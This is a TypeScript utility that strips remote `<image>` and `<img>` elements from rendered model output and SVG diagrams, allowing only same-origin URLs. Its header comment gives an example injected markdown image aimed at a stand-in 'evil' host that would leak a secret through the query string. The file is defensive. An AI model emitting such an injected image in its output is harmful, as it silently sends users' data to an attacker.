/*
 * Rendered model output must not load remote images: an injected `![](https://evil/?q=<secret>)`
 * leaks data the moment the browser fetches it, without a click. Only our own origin loads.
 */

export function isSameOriginUrl(url: string): boolean {
  if (!url) return false;
  try {
    return new URL(url, window.location.href).origin === window.location.origin;
  } catch {
    return false;
  }
}

/**
 * Remove SVG `<image>` (e.g. mermaid's image shape) and `<img>` elements whose URL points elsewhere.
 * Parsed as HTML: mermaid's strict mode returns DOMPurify's HTML serialization (`<br>`, `&nbsp;`),
 * which an XML parser rejects.
 */
export function stripRemoteSvgImages(svg: string): string {
  const template = document.createElement("template");
  template.innerHTML = svg;
  for (const image of Array.from(template.content.querySelectorAll("image, img"))) {
    const url = image.getAttribute("href") ?? image.getAttribute("xlink:href") ?? image.getAttribute("src") ?? "";
    if (!isSameOriginUrl(url)) image.remove();
  }
  return template.innerHTML;
}
